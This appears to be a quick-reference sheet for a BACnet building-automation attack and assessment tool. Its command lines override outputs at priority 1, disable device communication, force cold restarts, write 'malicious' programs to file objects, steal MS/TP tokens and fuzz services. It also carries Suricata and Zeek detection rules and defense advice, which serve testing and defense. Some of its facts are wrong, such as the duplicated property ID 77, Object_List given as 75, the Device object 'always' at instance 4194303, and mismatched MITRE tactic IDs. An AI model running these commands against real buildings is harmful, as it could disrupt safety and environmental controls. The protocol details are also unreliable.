# BACnet Protocol Quick Reference

## Protocol Overview
- **Protocol**: Building Automation and Control Networks (BACnet)
- **Port**: UDP/47808 (BACnet/IP), Serial RS-485 (MS/TP)
- **OSI Layer**: Application Layer
- **Specification**: ASHRAE 135, ISO 16484-5
- **Primary Use**: Building automation, HVAC, lighting, access control

## Attack Tool Reference
**Implementation**: `tools/bacnet_security_assessment/bacnet_assessment.py`
**Version**: 1.0
**Testing Guide**: `tools/bacnet_security_assessment/TESTING.md`

## PDU Types
| Type | Code | Description | Direction |
|------|------|-------------|-----------|
| Confirmed Request | 0x00 | Request requiring acknowledgment | Client->Server |
| Unconfirmed Request | 0x10 | Request without acknowledgment | Client->Server |
| Simple ACK | 0x20 | Simple acknowledgment | Server->Client |
| Complex ACK | 0x30 | ACK with data | Server->Client |
| Segment ACK | 0x40 | Segmentation acknowledgment | Bidirectional |
| Error | 0x50 | Error response | Server->Client |
| Reject | 0x60 | Request rejection | Server->Client |
| Abort | 0x70 | Transaction abort | Bidirectional |

**Reference**: `bacnet_assessment.py:52-60`

## Confirmed Services
| Code | Service | Purpose | MITRE |
|------|---------|---------|-------|
| 5 | SubscribeCOV | Monitor value changes | T0801, T0802 |
| 6 | AtomicReadFile | Read file data | T0802 |
| 7 | AtomicWriteFile | Write file data | T0873, T0871 |
| 10 | CreateObject | Create new object | T0871 |
| 11 | DeleteObject | Delete object | T0809 |
| 12 | ReadProperty | Read single property | T0801, T0861 |
| 14 | ReadPropertyMultiple | Read multiple properties | T0801, T0861 |
| 15 | WriteProperty | Write single property | T0855, T0836 |
| 16 | WritePropertyMultiple | Write multiple properties | T0836 |
| 17 | DeviceCommunicationControl | Block/enable communication | T0803, T0804 |
| 20 | ReinitializeDevice | Cold/warm restart | T0858, T0871 |

**Reference**: `bacnet_assessment.py:63-93`

## Unconfirmed Services
| Code | Service | Purpose | MITRE |
|------|---------|---------|-------|
| 0 | I-Am | Device announcement | T0888 |
| 1 | I-Have | Object announcement | T0888 |
| 2 | UnconfirmedCOVNotification | Value change notification | T0802 |
| 4 | UnconfirmedPrivateTransfer | Vendor-specific | - |
| 5 | UnconfirmedTextMessage | Text messaging | - |
| 6 | TimeSynchronization | Time sync | - |
| 8 | Who-Is | Device discovery | T0888, T0868 |
| 9 | Who-Has | Object discovery | T0861 |

**Reference**: `bacnet_assessment.py:96-105`

## Object Types
| Code | Type | Purpose | Common Uses |
|------|------|---------|-------------|
| 0 | Analog Input | AI values | Temperature, pressure sensors |
| 1 | Analog Output | AO values | Valve positions, damper control |
| 2 | Analog Value | AV internal | Setpoints, calculated values |
| 3 | Binary Input | BI values | Contact status, switch states |
| 4 | Binary Output | BO values | Relay control, ON/OFF commands |
| 5 | Binary Value | BV internal | Status flags, modes |
| 8 | Device | Device object | Always object instance 4194303 |
| 10 | File | File access | Programs, configuration files |
| 13 | Group | Object grouping | Scheduling groups |
| 14 | Loop | Control loop | PID controllers |
| 19 | Program | Logic programs | Control sequences |
| 23 | Schedule | Time schedules | Occupancy, setback schedules |

**Reference**: `bacnet_assessment.py:108-139`

## Property Identifiers (Key Properties)
| ID | Property | Object Types | Purpose |
|----|----------|--------------|---------|
| 77 | Object_Identifier | All | Unique object ID |
| 77 | Object_Name | All | Human-readable name |
| 79 | Object_Type | All | Object type code |
| 85 | Present_Value | AI/AO/AV/BI/BO/BV | Current value |
| 87 | Priority_Array | AO/BO/AV/BV | Command priority levels (1-16) |
| 103 | Relinquish_Default | AO/BO/AV/BV | Default when no priority |
| 111 | Status_Flags | AI/AO/AV/BI/BO/BV | In_Alarm, Fault, Overridden, Out_Of_Service |
| 81 | Out_Of_Service | Most objects | Disable/enable object |
| 28 | Description | All | Text description |
| 75 | Object_List | Device | List of all objects |

**Reference**: `bacnet_assessment.py:142-310`

## Priority Array Mechanism
BACnet uses a 16-level priority array for commanding outputs:

| Priority | Typical Use | Override Level |
|----------|-------------|----------------|
| 1 | Manual-Life Safety | Highest |
| 2 | Automatic-Life Safety | |
| 3 | Available | |
| 4 | Available | |
| 5 | Critical Equipment Control | |
| 6 | Minimum On/Off | |
| 7 | Available | |
| 8 | Manual Operator | BAS operator control |
| 9 | Available | |
| 10 | Available | |
| 11 | Available | |
| 12 | Available | |
| 13 | Available | |
| 14 | Available | |
| 15 | Available | |
| 16 | Schedule/Default | Lowest (normal operation) |

**Attack Strategy**: Write to Priority 1 to override all other commands

## Packet Structure

### BACnet/IP (BVLC + NPDU + APDU)
```
BVLL (BACnet Virtual Link Layer) Header (4 bytes):
  Type: 1 byte (0x81 = BACnet/IP)
  Function: 1 byte (0x0A = Original-Unicast-NPDU)
  Length: 2 bytes (total message length)

NPDU (Network Protocol Data Unit) Header (variable):
  Version: 1 byte (0x01)
  Control: 1 byte (message type, priority)
  DNET: 2 bytes (destination network, 0xFFFF if present)
  DLEN: 1 byte (destination length)
  DADR: DLEN bytes (destination address)
  SNET: 2 bytes (source network, if present)
  SLEN: 1 byte (source length)
  SADR: SLEN bytes (source address)
  Hop Count: 1 byte (if DNET present)

APDU (Application Protocol Data Unit):
  PDU Type: 1 byte (upper 4 bits = type, lower 4 bits = flags)
  Invoke ID: 1 byte (transaction ID, for confirmed services)
  Service Choice: 1 byte (service code)
  Service Parameters: variable (encoded with tags)
```
**Reference**: `bacnet_assessment.py:350-400`

### BACnet MS/TP (RS-485 Serial)
```
Preamble: 2 bytes (0x55 0xFF)
Frame Type: 1 byte
  - 0x00: Token
  - 0x01: Poll For Master
  - 0x02: Reply To Poll For Master
  - 0x03: Test_Request
  - 0x04: Test_Response
  - 0x05: BACnet Data Expecting Reply
  - 0x06: BACnet Data Not Expecting Reply
  - 0x07: Reply Postponed
Destination Address: 1 byte (0-127)
Source Address: 1 byte (0-127)
Length: 2 bytes (data length)
Header CRC: 1 byte
Data: variable (NPDU + APDU)
Data CRC: 2 bytes
```
**Reference**: MS/TP specification in ASHRAE 135

## Attack Methods

### 1. Device Discovery
```bash
# Who-Is broadcast (discover all devices)
python3 bacnet_assessment.py --target 192.168.1.255 discover --output devices.json

# Targeted Who-Is (specific device instance range)
python3 bacnet_assessment.py --target 192.168.1.255 discover \
  --device-instance-min 100 --device-instance-max 200
```
**MITRE**: T0888 (Remote System Discovery), T0868 (Detect Operating Mode)
**Tool Reference**: `bacnet_assessment.py:450-550`

### 2. Object Enumeration
```bash
# Enumerate all objects on a device
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 enumerate \
  --output objects.json

# Filter by object type
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 enumerate \
  --object-type analog-output
```
**MITRE**: T0861 (Point & Tag Identification), T0888 (Remote System Information Discovery)
**Tool Reference**: `bacnet_assessment.py:600-700`

### 3. Unauthorized WriteProperty
```bash
# Write Present_Value to Analog Output (Priority 1)
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 write-property \
  --object-type analog-output --object-instance 1 \
  --property present-value --value 100 --priority 1

# Write Present_Value to Binary Output
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 write-property \
  --object-type binary-output --object-instance 5 \
  --property present-value --value 1 --priority 1
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
**Tool Reference**: `bacnet_assessment.py:750-850`

### 4. Priority Array Manipulation
```bash
# Override all priorities by writing to Priority 1
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 priority-array \
  --object-type analog-output --object-instance 1 --priority 1 --value 9999

# Relinquish command (write NULL to specific priority)
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 priority-array \
  --object-type analog-output --object-instance 1 --priority 8 --relinquish
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
**Tool Reference**: `bacnet_assessment.py:900-1000`

### 5. Device Communication Control
```bash
# Disable communication (block all messages)
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 comm-control \
  --state disable --password <password>

# Enable communication
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 comm-control \
  --state enable --password <password>
```
**MITRE**: T0803 (Block Command Message), T0804 (Block Reporting Message)
**Tool Reference**: `bacnet_assessment.py:1050-1100`

### 6. Device Reinitialize
```bash
# Cold restart (complete reboot, lose RAM data)
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 reinitialize \
  --state cold-start --password <password>

# Warm restart (reload configuration, keep RAM)
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 reinitialize \
  --state warm-start --password <password>
```
**MITRE**: T0858 (Change Operating Mode), T0871 (Execution through API)
**Tool Reference**: `bacnet_assessment.py:1100-1150`

### 7. COV Subscription
```bash
# Subscribe to Change-of-Value notifications
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 subscribe-cov \
  --object-type analog-input --object-instance 0 --lifetime 300
```
**MITRE**: T0801 (Monitor Process State), T0802 (Automated Collection)
**Tool Reference**: `bacnet_assessment.py:1150-1200`

### 8. Atomic Write File (Project Infection)
```bash
# Write data to file object (inject malicious logic)
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 atomic-write-file \
  --file-instance 1 --start-position 0 --data-file malicious_program.bin
```
**MITRE**: T0873 (Project File Infection), T0871 (Execution through API)
**Tool Reference**: `bacnet_assessment.py:1200-1250`

### 9. MS/TP Token Manipulation
```bash
# Serial MS/TP token passing attack
python3 bacnet_assessment.py --serial /dev/ttyUSB0 --baud 38400 mstp-token \
  --station-address 10 --action steal
```
**MITRE**: T0803 (Block Command Message), T0804 (Block Reporting Message)
**Tool Reference**: `bacnet_assessment.py:1250-1300`

### 10. Protocol Fuzzing
```bash
# Fuzz WriteProperty service
python3 bacnet_assessment.py --target 192.168.1.10 --device-id 1001 fuzz \
  --service write-property --iterations 1000
```
**MITRE**: T0855 (Unauthorized Command Message)
**Tool Reference**: `bacnet_assessment.py:1300-1350`

## Detection Signatures

### Suricata Rules
**File**: `configs/suricata_rules/bacnet_detection.rules`

```
# Who-Is broadcast storm
alert udp any any -> any 47808 (msg:"ICS: BACnet Who-Is Broadcast Storm"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|01 20|"; distance:2; within:10; \
    content:"|08|"; distance:0; within:5; \
    threshold: type threshold, track by_src, count 10, seconds 10; \
    reference:url,attack.mitre.org/techniques/T0888; \
    classtype:industrial-protocol; sid:430001; rev:1;)

# Unauthorized WriteProperty (Priority 1-8)
alert udp any any -> any 47808 (msg:"ICS: BACnet Unauthorized WriteProperty"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|0F|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0855; \
    classtype:industrial-protocol; sid:430002; rev:1; priority:2;)

# ReadProperty enumeration
alert udp any any -> any 47808 (msg:"ICS: BACnet Property Enumeration"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|0C|"; distance:0; within:10; \
    threshold: type threshold, track by_src, count 20, seconds 30; \
    reference:url,attack.mitre.org/techniques/T0861; \
    classtype:industrial-protocol; sid:430003; rev:1;)

# Priority array manipulation (Priority 1)
alert udp any any -> any 47808 (msg:"ICS: BACnet Priority Array Manipulation"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|0F|"; distance:0; within:20; \
    content:"|87|"; distance:0; within:30; content:"|31 01|"; distance:0; within:5; \
    reference:url,attack.mitre.org/techniques/T0836; \
    classtype:industrial-protocol; sid:430004; rev:1; priority:1;)

# DeviceCommunicationControl
alert udp any any -> any 47808 (msg:"ICS: BACnet DeviceCommunicationControl"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|11|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0803; \
    classtype:industrial-protocol; sid:430005; rev:1; priority:1;)

# ReinitializeDevice cold restart
alert udp any any -> any 47808 (msg:"ICS: BACnet ReinitializeDevice Cold Restart"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|14|"; distance:0; within:10; content:"|09 00|"; distance:0; within:5; \
    reference:url,attack.mitre.org/techniques/T0858; \
    classtype:industrial-protocol; sid:430006; rev:1; priority:1;)

# ReinitializeDevice warm restart
alert udp any any -> any 47808 (msg:"ICS: BACnet ReinitializeDevice Warm Restart"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|14|"; distance:0; within:10; content:"|09 01|"; distance:0; within:5; \
    reference:url,attack.mitre.org/techniques/T0858; \
    classtype:industrial-protocol; sid:430007; rev:1; priority:1;)

# COV subscription storm
alert udp any any -> any 47808 (msg:"ICS: BACnet COV Subscription Storm"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|05|"; distance:0; within:10; \
    threshold: type threshold, track by_src, count 5, seconds 60; \
    reference:url,attack.mitre.org/techniques/T0801; \
    classtype:industrial-protocol; sid:430008; rev:1;)

# AtomicWriteFile (project infection)
alert udp any any -> any 47808 (msg:"ICS: BACnet AtomicWriteFile"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|07|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0873; \
    classtype:industrial-protocol; sid:430009; rev:1; priority:1;)

# AtomicReadFile (data exfiltration)
alert udp any any -> any 47808 (msg:"ICS: BACnet AtomicReadFile"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|06|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0802; \
    classtype:industrial-protocol; sid:430010; rev:1; priority:2;)

# Service fuzzing detection
alert udp any any -> any 47808 (msg:"ICS: BACnet Protocol Fuzzing"; \
    content:"|81 0A|"; offset:0; depth:2; dsize:>500; \
    threshold: type threshold, track by_src, count 10, seconds 10; \
    classtype:industrial-protocol; sid:430011; rev:1;)

# MS/TP token manipulation (serial/tunneled)
alert udp any any -> any 47808 (msg:"ICS: BACnet MS/TP Token Manipulation"; \
    content:"|81 01|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    threshold: type threshold, track by_src, count 10, seconds 5; \
    classtype:industrial-protocol; sid:430012; rev:1;)

# WritePropertyMultiple bulk modification
alert udp any any -> any 47808 (msg:"ICS: BACnet WritePropertyMultiple"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|10|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0836; \
    classtype:industrial-protocol; sid:430013; rev:1; priority:2;)

# CreateObject unauthorized creation
alert udp any any -> any 47808 (msg:"ICS: BACnet CreateObject"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|0A|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0871; \
    classtype:industrial-protocol; sid:430014; rev:1; priority:2;)

# DeleteObject data destruction
alert udp any any -> any 47808 (msg:"ICS: BACnet DeleteObject"; \
    content:"|81 0A|"; offset:0; depth:2; content:"|00|"; distance:2; depth:1; \
    content:"|0B|"; distance:0; within:10; \
    reference:url,attack.mitre.org/techniques/T0809; \
    classtype:industrial-protocol; sid:430015; rev:1; priority:1;)
```

### Zeek Detection
**File**: `configs/zeek/bacnet_monitor.zeek`

```zeek
module BACnet_Monitor;

export {
    redef enum Log::ID += { LOG };
    
    type Info: record {
        ts: time &log;
        uid: string &log;
        id: conn_id &log;
        service: count &log;
        operation: string &log;
        severity: string &log;
        details: string &log;
    };
}

# Who-Is broadcast storm detection
global whois_count: table[addr] of count &create_expire=10sec;

event bacnet_whois(c: connection) {
    if (c$id$orig_h !in whois_count) {
        whois_count[c$id$orig_h] = 0;
    }
    whois_count[c$id$orig_h] += 1;
    
    if (whois_count[c$id$orig_h] >= 10) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service=8, $operation="WHO_IS_STORM", $severity="HIGH",
            $details=fmt("Who-Is count: %d in 10s", whois_count[c$id$orig_h])]);
    }
}

# WriteProperty tracking
event bacnet_write_property(c: connection, object_type: count, object_instance: count, 
                              property_id: count, priority: count, value: string) {
    local severity = "HIGH";
    local operation = "WRITE_PROPERTY";
    
    # Priority 1-8 are critical overrides
    if (priority >= 1 && priority <= 8) {
        severity = "CRITICAL";
        operation = "PRIORITY_OVERRIDE";
    }
    
    # Priority Array manipulation (property 87)
    if (property_id == 87) {
        severity = "CRITICAL";
        operation = "PRIORITY_ARRAY_MANIPULATION";
    }
    
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service=15, $operation=operation, $severity=severity,
        $details=fmt("Object: %d:%d, Property: %d, Priority: %d", 
                    object_type, object_instance, property_id, priority)]);
}

# DeviceCommunicationControl monitoring
event bacnet_device_communication_control(c: connection, state: count, duration: count) {
    local operation = "";
    if (state == 0) {
        operation = "ENABLE_COMMUNICATION";
    } else if (state == 1) {
        operation = "DISABLE_COMMUNICATION";
    } else if (state == 2) {
        operation = "DISABLE_INITIATION";
    }
    
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service=17, $operation=operation, $severity="CRITICAL",
        $details=fmt("State: %d, Duration: %d seconds", state, duration)]);
}

# ReinitializeDevice cold/warm restart tracking
event bacnet_reinitialize_device(c: connection, state: count) {
    local operation = "";
    if (state == 0) {
        operation = "COLD_RESTART";
    } else if (state == 1) {
        operation = "WARM_RESTART";
    }
    
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service=20, $operation=operation, $severity="CRITICAL",
        $details=fmt("Restart type: %s", operation)]);
}

# COV subscription storm detection
global cov_subscribe_count: table[addr] of count &create_expire=60sec;

event bacnet_subscribe_cov(c: connection, object_type: count, object_instance: count, lifetime: count) {
    if (c$id$orig_h !in cov_subscribe_count) {
        cov_subscribe_count[c$id$orig_h] = 0;
    }
    cov_subscribe_count[c$id$orig_h] += 1;
    
    if (cov_subscribe_count[c$id$orig_h] >= 5) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service=5, $operation="COV_SUBSCRIPTION_STORM", $severity="HIGH",
            $details=fmt("Subscriptions: %d in 60s", cov_subscribe_count[c$id$orig_h])]);
    }
}

# AtomicWriteFile monitoring
event bacnet_atomic_write_file(c: connection, file_instance: count, start_position: count, data_length: count) {
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service=7, $operation="ATOMIC_WRITE_FILE", $severity="CRITICAL",
        $details=fmt("File: %d, Position: %d, Length: %d", file_instance, start_position, data_length)]);
}

# AtomicReadFile monitoring
event bacnet_atomic_read_file(c: connection, file_instance: count, start_position: count, requested_count: count) {
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service=6, $operation="ATOMIC_READ_FILE", $severity="MEDIUM",
        $details=fmt("File: %d, Position: %d, Count: %d", file_instance, start_position, requested_count)]);
}

# MS/TP token manipulation detection (if BACnet/IP is tunneling MS/TP)
global mstp_token_count: table[addr] of count &create_expire=5sec;

event bacnet_mstp_token(c: connection, station_address: count) {
    if (c$id$orig_h !in mstp_token_count) {
        mstp_token_count[c$id$orig_h] = 0;
    }
    mstp_token_count[c$id$orig_h] += 1;
    
    if (mstp_token_count[c$id$orig_h] >= 10) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service=0, $operation="MSTP_TOKEN_MANIPULATION", $severity="CRITICAL",
            $details=fmt("Token operations: %d in 5s", mstp_token_count[c$id$orig_h])]);
    }
}
```

## MITRE ATT&CK Mapping

### Reconnaissance (Tactic: TA0043)
- **T0888**: Remote System Information Discovery
  - Methods: Who-Is, discover_devices(), enumerate_objects()
- **T0801**: Monitor Process State
  - Methods: ReadProperty, SubscribeCOV
- **T0868**: Detect Operating Mode
  - Methods: Device object queries

### Discovery (Tactic: TA0102)
- **T0861**: Point & Tag Identification
  - Methods: ReadProperty, enumerate_objects(), Who-Has

### Collection (Tactic: TA0100)
- **T0802**: Automated Collection
  - Methods: SubscribeCOV, AtomicReadFile, ReadPropertyMultiple

### Execution (Tactic: TA0104)
- **T0871**: Execution through API
  - Methods: AtomicWriteFile, ReinitializeDevice

### Command and Control (Tactic: TA0011)
- **T0858**: Change Operating Mode
  - Methods: ReinitializeDevice

### Impact (Tactic: TA0105)
- **T0855**: Unauthorized Command Message
  - Methods: WriteProperty, write_property(), fuzz_service()
- **T0836**: Modify Parameter
  - Methods: WriteProperty, manipulate_priority_array()
- **T0809**: Data Destruction
  - Methods: DeleteObject, ReinitializeDevice (cold)
- **T0803**: Block Command Message
  - Methods: DeviceCommunicationControl, mstp_token_manipulation()
- **T0804**: Block Reporting Message
  - Methods: DeviceCommunicationControl

### Persistence (Tactic: TA0110)
- **T0873**: Project File Infection
  - Methods: AtomicWriteFile

## Common Vulnerabilities

### No Authentication
- **Issue**: Standard BACnet has no authentication
- **Impact**: Any network client can read/write
- **Mitigation**: BACnet/SC (Secure Connect), network segmentation

### Priority Array Override
- **Issue**: Priority 1 overrides all other commands
- **Impact**: Complete control of outputs
- **Mitigation**: Monitor Priority 1-8 writes, access control

### Broadcast Enumeration
- **Issue**: Who-Is broadcast reveals all devices
- **Impact**: Complete device discovery
- **Mitigation**: Firewall broadcasts, monitor Who-Is frequency

### File Object Manipulation
- **Issue**: AtomicWriteFile allows program modification
- **Impact**: Logic injection, backdoor installation
- **Mitigation**: Disable file objects if not needed, integrity checks

### MS/TP Token Passing
- **Issue**: Token can be stolen or manipulated
- **Impact**: Denial of service, network disruption
- **Mitigation**: Monitor token timing, station address validation

## Defense Recommendations

### Network Layer
1. **Segmentation**: Isolate BACnet networks from IT networks
2. **Firewall Rules**: 
   - Restrict UDP/47808 to authorized building automation systems
   - Block Who-Is broadcasts or limit to local subnet
3. **IDS/IPS**: Deploy Suricata rules for BACnet monitoring
4. **Network Monitoring**: Zeek scripts for protocol analysis

### Device Configuration
1. **Password Protection**: Enable DeviceCommunicationControl and ReinitializeDevice passwords
2. **Read-Only Objects**: Mark critical objects as Out_Of_Service=FALSE and non-writable
3. **Priority Restrictions**: Disable Priority 1-8 writes if not required
4. **File Objects**: Disable or restrict file object access

### Application Layer
1. **Priority Monitoring**: Alert on Priority 1-5 WriteProperty
2. **Property Whitelisting**: Maintain list of authorized writable properties
3. **COV Rate Limiting**: Limit subscription frequency per client
4. **Baseline Values**: Monitor for unexpected Present_Value changes

### Operational
1. **Baseline Traffic**: Establish normal BACnet communication patterns
2. **Change Management**: Document all WriteProperty operations
3. **Device Inventory**: Maintain database of all device instances
4. **Incident Response**: Define procedures for anomalous BACnet activity

## Protocol Limits
- **Max APDU Size**: 1476 bytes (BACnet/IP), configurable
- **Max Object Instance**: 4194303 (0x3FFFFF)
- **Max Property Array Index**: 4294967295 (0xFFFFFFFF)
- **Device Object Instance**: Always 4194303
- **Priority Levels**: 1-16 (1=highest, 16=lowest)
- **MS/TP Station Address**: 0-127 (0-254 with extensions)

## Testing Checklist

### Reconnaissance Testing
- [ ] Who-Is broadcast enumeration
- [ ] Device object property reads
- [ ] Object list enumeration
- [ ] Property discovery per object type
- [ ] Network number/address mapping

### Read Testing
- [ ] ReadProperty (Present_Value)
- [ ] ReadPropertyMultiple
- [ ] ReadProperty (Priority_Array)
- [ ] ReadProperty (Object_List)
- [ ] AtomicReadFile

### Write Testing
- [ ] WriteProperty (Present_Value, Priority 16)
- [ ] WriteProperty (Priority 1 override)
- [ ] WritePropertyMultiple
- [ ] Priority array relinquish (NULL write)
- [ ] Out_Of_Service manipulation

### Control Testing
- [ ] DeviceCommunicationControl (disable)
- [ ] ReinitializeDevice (cold restart)
- [ ] ReinitializeDevice (warm restart)
- [ ] CreateObject
- [ ] DeleteObject

### Advanced Testing
- [ ] SubscribeCOV storm
- [ ] AtomicWriteFile (project infection)
- [ ] MS/TP token manipulation (serial)
- [ ] Protocol fuzzing (malformed APDU)
- [ ] BBMD (BACnet Broadcast Management Device) manipulation

### Detection Validation
- [ ] Suricata rule triggering
- [ ] Zeek log generation
- [ ] SIEM alert verification
- [ ] False positive analysis
- [ ] PCAP validation

## References
- ASHRAE 135-2020 (BACnet Specification)
- ISO 16484-5 (BACnet International Standard)
- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/bacnet_security_assessment/bacnet_assessment.py`
- Detection Rules: `configs/suricata_rules/bacnet_detection.rules`
- Zeek Monitor: `configs/zeek/bacnet_monitor.zeek`
- Testing Guide: `tools/bacnet_security_assessment/TESTING.md`
